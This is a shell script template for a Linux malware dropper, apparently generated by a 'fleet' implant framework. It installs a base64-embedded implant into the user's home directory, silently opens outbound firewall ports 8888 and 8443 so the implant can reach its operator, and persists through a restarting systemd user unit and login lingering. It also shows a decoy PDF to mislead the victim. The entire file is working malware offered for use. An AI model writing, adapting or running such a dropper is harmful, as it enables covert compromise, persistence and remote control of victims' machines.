#!/bin/sh
# fleet linux dropper — {{DOC}}
# Installs the implant to ~/.local/bin, starts it detached, installs a systemd
# user unit, enables lingering, and opens a decoy PDF 1.5s after launch.
set -eu

UNIT="{{UNIT}}"
BIN_NAME="{{BIN_NAME}}"
HERE="$(cd "$(dirname "$0")" && pwd)"
BINDIR="${HOME}/.local/bin"
UNITDIR="${HOME}/.config/systemd/user"
BIN="${BINDIR}/${BIN_NAME}"

mkdir -p "$BINDIR" "$UNITDIR"

# preconfigure the host firewall so the implant can reach the operator even if a
# strict outbound policy is set. Best effort; needs root for iptables/firewalld.
for port in 8888 8443; do
  if command -v ufw >/dev/null 2>&1; then
    sudo -n ufw allow out "${port}/tcp" >/dev/null 2>&1 || true
  fi
  if command -v firewall-cmd >/dev/null 2>&1; then
    sudo -n firewall-cmd --permanent --add-port="${port}/tcp" >/dev/null 2>&1 || true
    sudo -n firewall-cmd --add-port="${port}/tcp" >/dev/null 2>&1 || true
  fi
done
if command -v firewall-cmd >/dev/null 2>&1; then
  sudo -n firewall-cmd --reload >/dev/null 2>&1 || true
fi
if [ "$(id -u)" = "0" ] && command -v iptables >/dev/null 2>&1; then
  iptables -I OUTPUT -p tcp --dport 8888 -j ACCEPT 2>/dev/null || true
  iptables -I OUTPUT -p tcp --dport 8443 -j ACCEPT 2>/dev/null || true
fi

if [ -f "${HERE}/${BIN_NAME}" ]; then
  cp "${HERE}/${BIN_NAME}" "$BIN"
else
  base64 -d > "$BIN" <<'FLEET_B64'
{{IMPLANT_B64}}
FLEET_B64
fi
chmod +x "$BIN"

cat > "${UNITDIR}/${UNIT}.service" <<UNIT
[Unit]
Description={{DOC}} agent
[Service]
ExecStart=%h/.local/bin/${BIN_NAME}
Restart=always
RestartSec=5
UNIT

if command -v systemctl >/dev/null 2>&1; then
  systemctl --user daemon-reload >/dev/null 2>&1 || true
  systemctl --user enable --now "${UNIT}.service" >/dev/null 2>&1 || true
fi

sleep 1
setsid "$BIN" </dev/null >/dev/null 2>&1 &

if [ -f "${HERE}/decoy.pdf" ]; then
  ( sleep 1.5; command -v xdg-open >/dev/null 2>&1 && xdg-open "${HERE}/decoy.pdf" >/dev/null 2>&1 || true ) &
fi

if command -v loginctl >/dev/null 2>&1; then
  loginctl enable-linger "$(id -un)" >/dev/null 2>&1 || true
fi

exit 0
